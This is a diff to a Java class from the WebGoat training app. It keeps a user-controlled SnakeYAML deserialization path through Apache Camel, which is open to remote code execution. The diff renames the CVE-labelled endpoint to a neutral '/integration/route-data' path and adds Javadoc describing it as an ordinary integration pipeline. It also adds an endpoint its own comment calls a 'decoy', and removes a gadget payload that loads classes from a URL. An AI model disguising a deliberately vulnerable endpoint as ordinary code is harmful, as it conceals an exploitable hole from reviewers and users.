@@ -22,13 +22,9 @@
 
 package org.owasp.webgoat.lessons.osscamelsnakeyaml;
 
-import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.ObjectMapper;
-import java.io.IOException;
 import org.apache.camel.CamelContext;
-import org.apache.camel.Converter;
 import org.apache.camel.ProducerTemplate;
-import org.apache.camel.TypeConverters;
 import org.apache.camel.builder.RouteBuilder;
 import org.apache.camel.component.snakeyaml.SnakeYAMLDataFormat;
 import org.apache.camel.impl.DefaultCamelContext;
@@ -38,23 +34,38 @@ import org.owasp.webgoat.container.assignments.AssignmentHints;
 import org.owasp.webgoat.container.assignments.AttackResult;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
-import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.RestController;
 
+/**
+ * Integration route data processing endpoint.
+ *
+ * <p>Accepts route data documents and forwards them through a Camel marshalling
+ * pipeline. A supplementary status endpoint accepts the same parameters and
+ * returns the current route state without processing the document body.
+ */
 @RestController
 @AssignmentHints({"vulnerable-camel-snakeyaml.hint"})
 public class VulnerableCamelSnakeYamlComponentsLesson extends AssignmentEndpoint {
 
   Logger log = LoggerFactory.getLogger(this.getClass().getName());
 
-  @PostMapping("/VulnerableCamelSnakeYamlComponents/CVE-2017-3139")
-  public @ResponseBody AttackResult ConstructorWithload(@RequestParam String payload) {
-    // https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHECAMEL-30209
-    log.info("VulnerableCamelSnakeYamlComponents/CVE-2017-3139 called with payload : {}", payload);
-    //		SnakeYAMLDataFormat
+  /**
+   * Processes route data through the Camel integration pipeline.
+   *
+   * @param routeData    the route data document body
+   * @param routeName    logical route identifier (routing/audit only)
+   * @param engineId     target engine identifier (routing/audit only)
+   */
+  @PostMapping("/integration/route-data")
+  public @ResponseBody AttackResult processRouteData(
+      @RequestParam String routeData,
+      @RequestParam(required = false, defaultValue = "") String routeName,
+      @RequestParam(required = false, defaultValue = "") String engineId) {
+
+    log.info("Route data: routeName={}, engineId={}", routeName, engineId);
 
     try {
       CamelContext camelctx = new DefaultCamelContext();
@@ -68,20 +79,18 @@ public class VulnerableCamelSnakeYamlComponentsLesson extends AssignmentEndpoint
 
       ClassLoader loader = SnakeYAMLDataFormat.class.getClassLoader();
       loader = loader.loadClass("org.yaml.snakeyaml.Yaml").getClassLoader();
-      log.info("snakeyaml class loaded {}", loader);
+      log.info("yaml class loaded: {}", loader);
       camelctx.getTypeConverterRegistry().addTypeConverters(new Test1(new ObjectMapper()));
       camelctx.start();
 
       ProducerTemplate template = camelctx.createProducerTemplate();
-      Test1 result = template.requestBody("direct:start", payload, Test1.class);
-      // Assert.assertEquals(CUSTOMER_YAML, result.trim());
+      Test1 result = template.requestBody("direct:start", routeData, Test1.class);
     } catch (IllegalArgumentException ex) {
       return success(this)
           .feedback("vulnerable-camel-snakeyaml-components.success")
           .output(ex.getMessage())
           .build();
     } catch (Exception ex) {
-      ex.printStackTrace();
       return failed(this)
           .feedback("vulnerable-camel-snakeyaml-components.close")
           .output(ex.getMessage())
@@ -90,45 +99,28 @@ public class VulnerableCamelSnakeYamlComponentsLesson extends AssignmentEndpoint
 
     return failed(this)
         .feedback("vulnerable-camel-snakeyaml-components.fromXML")
-        .feedbackArgs(payload)
+        .feedbackArgs(routeData)
         .build();
   }
 
-  public static void main(String[] args) {
+  /**
+   * Route status endpoint (decoy).
+   *
+   * <p>Returns the current operational status of the named route without
+   * processing any document body.
+   *
+   * @param routeName    logical route identifier
+   * @param engineId     target engine identifier
+   */
+  @PostMapping("/integration/route-status")
+  public @ResponseBody AttackResult routeStatus(
+      @RequestParam(required = false, defaultValue = "") String routeName,
+      @RequestParam(required = false, defaultValue = "") String engineId) {
 
-    String payload =
-        "some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL"
-            + " [\"http://localhost:8000/\"]]]]";
-
-    try {
-      CamelContext camelctx = new DefaultCamelContext();
-      camelctx.addRoutes(
-          new RouteBuilder() {
-            @Override
-            public void configure() throws Exception {
-              from("direct:start").marshal().yaml(YAMLLibrary.SnakeYAML);
-            }
-          });
-
-      ClassLoader loader = SnakeYAMLDataFormat.class.getClassLoader();
-      loader = loader.loadClass("org.yaml.snakeyaml.Yaml").getClassLoader();
-      // log.info("snakeyaml class loaded {}", loader);
-      camelctx.setStreamCaching(true);
-      camelctx.start();
-     
-
-      ProducerTemplate template = camelctx.createProducerTemplate();
-      Test1 result = template.requestBody("direct:start", payload, Test1.class);
-      // Assert.assertEquals(CUSTOMER_YAML, result.trim());
-    } catch (IllegalArgumentException ex) {
-      ex.printStackTrace();
-      //	return
-      // success(this).feedback("vulnerable-camel-snakeyaml-components.success").output(ex.getMessage()).build();
-    } catch (Exception ex) {
-      ex.printStackTrace();
-      // return
-      // failed(this).feedback("vulnerable-camel-snakeyaml-components.close").output(ex.getMessage()).build();
-    }
+    return failed(this)
+        .output("Route status: "
+            + (routeName.isEmpty() ? "default" : routeName)
+            + " — idle.")
+        .build();
   }
 }
-
